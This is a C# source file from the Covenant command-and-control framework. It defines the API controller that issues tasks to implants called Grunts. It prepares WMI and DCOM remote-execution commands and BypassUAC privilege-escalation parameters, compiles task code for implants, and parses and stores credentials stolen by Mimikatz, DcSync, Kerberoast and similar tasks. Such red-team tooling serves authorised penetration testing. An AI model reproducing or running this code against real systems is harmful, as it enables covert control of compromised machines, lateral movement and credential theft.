// Author: Ryan Cobb (@cobbr_io)
// Project: Covenant (https://github.com/cobbr/Covenant)
// License: GNU GPLv3

using System;
using System.Linq;
using System.Collections.Generic;
using Microsoft.AspNetCore.Mvc;
using Microsoft.AspNetCore.Authorization;

using Covenant.Models;
using Covenant.Models.Grunts;
using Covenant.Models.Launchers;
using Covenant.Models.Covenant;

namespace Covenant.Controllers
{
    [Authorize]
	[ApiController]
    [Route("api")]
    public class GruntTaskingController : Controller
    {
        private readonly CovenantContext _context;

        public GruntTaskingController(CovenantContext context)
        {
            _context = context;
        }

        // GET: api/grunttaskings
        // <summary>
        // Get GruntTaskings
        // </summary>
        [HttpGet("grunttaskings", Name = "GetAllGruntTaskings")]
        public IEnumerable<GruntTasking> GetAllGruntTaskings()
        {
            return _context.GruntTaskings.ToList();
        }

        // GET: api/grunts/{id}/taskings
        // <summary>
        // Get GruntTaskings
        // </summary>
        [HttpGet("grunts/{id}/taskings", Name = "GetGruntTaskings")]
        public IEnumerable<GruntTasking> GetGruntTaskings(int id)
        {
            return _context.GruntTaskings.Where(GT => GT.GruntId == id).ToList();
        }

        // GET: api/grunts/{id}/taskings/search
        // <summary>
        // Get GruntTaskings for Grunt or any child Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/search", Name = "GetSearchGruntTaskings")]
        public IEnumerable<GruntTasking> GetSearchGruntTaskings(int id)
        {
            List<GruntTasking> search = new List<GruntTasking>();
            foreach (GruntTasking task in _context.GruntTaskings)
            {
                if (this.IsChildGrunt(id, task.GruntId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        // GET: api/grunts/{id}/taskings/uninitialized
        // <summary>
        // Get uninitialized GruntTaskings for Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/uninitialized", Name = "GetUninitializedGruntTaskings")]
        public IEnumerable<GruntTasking> GetUninitializedGruntTaskings(int id)
        {
            return _context.GruntTaskings
                .Where(GT => GT.GruntId == id && GT.status == GruntTasking.GruntTaskingStatus.Uninitialized)
                .ToList();
        }

        // GET: api/grunts/{id}/taskings/search/uninitialized
        // <summary>
        // Get uninitialized GruntTaskings for Grunt or any child Grunt
        // </summary>
        [HttpGet("grunts/{id}/taskings/search/uninitialized", Name = "GetSearchUninitializedGruntTaskings")]
        public IEnumerable<GruntTasking> GetSearchUninitializedGruntTaskings(int id)
        {
            List<GruntTasking> uninitializedTasks = _context.GruntTaskings.Where(GT => GT.status == GruntTasking.GruntTaskingStatus.Uninitialized).ToList();
            List<GruntTasking> search = new List<GruntTasking>();
            foreach (GruntTasking task in uninitializedTasks)
            {
                if (this.IsChildGrunt(id, task.GruntId))
                {
                    search.Add(task);
                }
            }
            return search;
        }

        // GET api/grunts/{id}/taskings/{taskname}
        // <summary>
        // Get a GruntTasking
        // </summary>
        [HttpGet("grunts/{id}/taskings/{taskname}", Name = "GetGruntTasking")]
        public ActionResult<GruntTasking> GetGruntTasking(int id, string taskname)
        {
            GruntTasking gruntTasking = _context.GruntTaskings.FirstOrDefault(GT => GT.GruntId == id && GT.Name == taskname);
            if (gruntTasking == null)
            {
                return NotFound();
            }
            return Ok(gruntTasking);
        }

        // POST api/grunts/{id}/taskings
        // <summary>
        // Create a GruntTasking
        // </summary>
        [HttpPost("grunts/{id}/taskings", Name = "CreateGruntTasking")]
        [ProducesResponseType(typeof(GruntTasking), 201)]
        public ActionResult<GruntTasking> CreateGruntTasking(int id, [FromBody] GruntTasking gruntTasking)
        {
            Models.Grunts.Grunt grunt = _context.Grunts.FirstOrDefault(G => G.Id == id);
            if (grunt == null)
            {
                return NotFound();
            }
            if (gruntTasking.type == GruntTasking.GruntTaskingType.Assembly)
            {
                GruntTask task = _context.GruntTasks.FirstOrDefault(T => T.Id == gruntTasking.TaskId);
                if (task == null)
                {
                    return NotFound();
                }
                task.Options = _context.GruntTaskOptions.Where(O => O.TaskId == task.Id).ToList();
                List<string> parameters = task.Options.OrderBy(O => O.OptionId).Select(O => O.Value).ToList();
                if (task.Name.ToLower() == "wmi")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[3].ToLower());
                    if ((parameters[4] != null && parameters[4] != "") || l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        // If using custom command
                        // Remove the "Launcher" parameter
                        parameters.RemoveAt(3);
                    }
                    else
                    {
                        // If using Launcher
                        // Remove the "Command" parameter
                        parameters.RemoveAt(4);

                        // Set LauncherString to WMI command parameter
                        parameters[3] = l.LauncherString;
                    }
                }
                else if (task.Name.ToLower() == "dcom")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[1].ToLower());
                    if ((parameters[2] != null && parameters[2] != "") || l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        // If using custom command
                        // Remove the "Launcher" parameter
                        parameters.RemoveAt(1);

                        // Add .exe exetension if needed
                        List<string> split = parameters[1].Split(" ").ToList();
                        parameters[1] = split[0];
                        if (!parameters[1].EndsWith(".exe")) { parameters[1] += ".exe"; }

                        split.RemoveAt(0);
                        parameters.Insert(2, String.Join(" ", split.ToArray()));
                        string Directory = "C:\\WINDOWS\\System32\\";
                        if (parameters[1].ToLower().Contains("powershell.exe")) { Directory += "WindowsPowerShell\\v1.0\\"; }
                        else if (parameters[1].ToLower().Contains("wmic.exe")) { Directory += "wbem\\"; }

                        parameters.Insert(3, Directory);
                    }
                    else
                    {
                        // If using Launcher
                        // Remove the "Command" parameter
                        parameters.RemoveAt(2);

                        // Set LauncherString to DCOM command parameter
                        parameters[1] = l.LauncherString;

                        // Add .exe exetension if needed
                        List<string> split = parameters[1].Split(" ").ToList();
                        parameters[1] = split[0];
                        if (!parameters[1].EndsWith(".exe")) { parameters[1] += ".exe"; }

                        split.RemoveAt(0);
                        parameters.Insert(2, String.Join(" ", split.ToArray()));
                        string Directory = "C:\\WINDOWS\\System32\\";
                        if (parameters[1].ToLower().Contains("powershell.exe")) { Directory += "WindowsPowerShell\\v1.0\\"; }
                        else if (parameters[1].ToLower().Contains("wmic.exe")) { Directory += "wbem\\"; }

                        parameters.Insert(3, Directory);
                    }
                }
                else if (task.Name.ToLower() == "bypassuac")
                {
                    Launcher l = _context.Launchers.FirstOrDefault(L => L.Name.ToLower() == parameters[0].ToLower());
                    if ((parameters[1] != null && parameters[1] != "") || l == null || l.LauncherString == null || l.LauncherString.Trim() == "")
                    {
                        // If using custom command
                        // Remove the "Launcher" parameter
                        parameters.RemoveAt(0);

                        // Add .exe exetension if needed
                        string[] split = parameters[0].Split(" ");
                        parameters[0] = split.FirstOrDefault();
                        if (!parameters[0].EndsWith(".exe")) { parameters[0] += ".exe"; }

                        // Add parameters needed for BypassUAC Task
                        parameters.Add(String.Join(" ", split.ToList().GetRange(1, split.Count() - 1)));
                        parameters.Add("C:\\WINDOWS\\System32\\");
                        if (parameters[0].ToLower().Contains("powershell.exe")) { parameters[2] += "WindowsPowerShell\\v1.0\\"; }
                        else if (parameters[0].ToLower().Contains("wmic.exe")) { parameters[2] += "wbem\\"; }
                        parameters.Add("0");
                    }
                    else
                    {
                        // If using Launcher
                        // Remove the "Command" parameter
                        parameters.RemoveAt(1);

                        // Add .exe exetension if needed
                        string[] split = l.LauncherString.Split(" ");
                        parameters[0] = split.FirstOrDefault();
                        if (!parameters[0].EndsWith(".exe")) { parameters[0] += ".exe"; }

                        // Add parameters need for BypassUAC Task
                        parameters.Add(String.Join(" ", split.ToList().GetRange(1, split.Count() - 1)));
                        parameters.Add("C:\\WINDOWS\\System32\\");
                        if (l.Name.ToLower() == "powershell") { parameters[2] += "WindowsPowerShell\\v1.0\\"; }
                        else if (l.Name.ToLower() == "wmic") { parameters[2] += "wbem\\"; }
                        parameters.Add("0");
                    }
                }
                try
                {
                    gruntTasking.Compile(
                        task.Code, parameters,
                        task.GetReferenceAssemblies(),
                        task.GetReferenceSourceLibraries(),
                        task.GetEmbeddedResources(),
                        grunt.DotNetFrameworkVersion
                    );
                }
                catch (Exception e)
                {
                    Console.Error.WriteLine("Task Compilation failed: " + e.Message + e.StackTrace);
                    return BadRequest("Task returned compilation errors:" + e.Message + e.StackTrace);
                }
            }
            _context.GruntTaskings.Add(gruntTasking);
            _context.SaveChanges();
            return CreatedAtRoute(nameof(GetGruntTasking), new { id = id, taskname = gruntTasking.Name }, gruntTasking);
        }

        // PUT api/grunts/{id}/taskings/{taskname}
        // <summary>
        // Edit a GruntTasking
        // </summary>
        [HttpPut("grunts/{id}/taskings/{taskname}", Name = "EditGruntTasking")]
        public ActionResult<GruntTasking> EditGruntTasking(int id, string taskname, [FromBody] GruntTasking gruntTasking)
        {
            GruntTasking updatingGruntTasking = _context.GruntTaskings.FirstOrDefault(GT => id == GT.GruntId && taskname == GT.Name);
            if (updatingGruntTasking == null)
            {
                return NotFound();
            }
            List<String> credTaskNames = new List<string> { "Mimikatz", "SamDump", "LogonPasswords", "DcSync", "Rubeus", "Kerberoast" };
            GruntTask gruntTask = _context.GruntTasks.FirstOrDefault(G => G.Id == gruntTasking.TaskId);
            if (credTaskNames.Contains(gruntTask.Name))
            {
                List<CapturedCredential> capturedCredentials = CapturedCredential.ParseCredentials(gruntTasking.GruntTaskOutput);
                foreach (CapturedCredential cred in capturedCredentials)
                {
                    if (!ContextContainsCredentials(cred))
                    {
                        _context.Credentials.Add(cred);
                        _context.SaveChanges();
                    }
                }
            }
            updatingGruntTasking.status = gruntTasking.status;
            updatingGruntTasking.GruntTaskOutput = gruntTasking.GruntTaskOutput;
            _context.GruntTaskings.Update(updatingGruntTasking);
            _context.SaveChanges();

            return Ok(updatingGruntTasking);
        }

        // DELETE api/grunts/{id}/taskings/{task_name}
        // <summary>
        // Delete a GruntTasking
        // </summary>
        [HttpDelete("grunts/{id}/taskings/{taskname}", Name = "DeleteGruntTasking")]
        [ProducesResponseType(204)]
        public ActionResult DeleteGruntTasking(int id, string taskname)
        {
            GruntTasking removingGruntTasking = _context.GruntTaskings.FirstOrDefault(GT => id == GT.GruntId && GT.Name == taskname);
            if (removingGruntTasking == null)
            {
                return NotFound();
            }

            _context.GruntTaskings.Remove(removingGruntTasking);
            _context.SaveChanges();

            return new NoContentResult();
        }

        private bool IsChildGrunt(int ParentId, int ChildId)
        {
            if (ParentId == ChildId)
            {
                return true;
            }
            Models.Grunts.Grunt parentGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ParentId);
            Models.Grunts.Grunt childGrunt = _context.Grunts.FirstOrDefault(G => G.Id == ChildId);
            if (parentGrunt.GetChildren().Contains(childGrunt.GUID))
            {
                return true;
            }
            foreach (string child in parentGrunt.GetChildren())
            {
                Models.Grunts.Grunt directChild = _context.Grunts.FirstOrDefault(G => G.Name == child);
                if (IsChildGrunt(directChild.Id, ChildId))
                {
                    return true;
                }
            }
            return false;
        }

        private bool ContextContainsCredentials(CapturedCredential cred)
        {
            switch (cred.Type)
            {
                case CapturedCredential.CredentialType.Password:
                    CapturedPasswordCredential passcred = (CapturedPasswordCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Password)
                                   .Select(C => (CapturedPasswordCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == passcred.Type &&
                                       PC.Domain == passcred.Domain &&
                                       PC.Username == passcred.Username &&
                                       PC.Password == passcred.Password
                                   ) != null;
                case CapturedCredential.CredentialType.Hash:
                    CapturedHashCredential hashcred = (CapturedHashCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Hash)
                                   .Select(C => (CapturedHashCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == hashcred.Type &&
                                       PC.Domain == hashcred.Domain &&
                                       PC.Username == hashcred.Username &&
                                       PC.Hash == hashcred.Hash &&
                                       PC.HashCredentialType == hashcred.HashCredentialType
                                   ) != null;
                case CapturedCredential.CredentialType.Ticket:
                    CapturedTicketCredential ticketcred = (CapturedTicketCredential)cred;
                    return _context.Credentials.Where(C => C.Type == CapturedCredential.CredentialType.Ticket)
                                   .Select(C => (CapturedTicketCredential)C)
                                   .FirstOrDefault(PC =>
                                       PC.Type == ticketcred.Type &&
                                       PC.Domain == ticketcred.Domain &&
                                       PC.Username == ticketcred.Username &&
                                       PC.Ticket == ticketcred.Ticket &&
                                       PC.TicketCredentialType == ticketcred.TicketCredentialType
                                   ) != null;
                default:
                    return _context.Credentials.FirstOrDefault(P =>
                                       P.Type == cred.Type &&
                                       P.Domain == cred.Domain &&
                                       P.Username == cred.Username
                                   ) != null;
            }
        }
    }
}
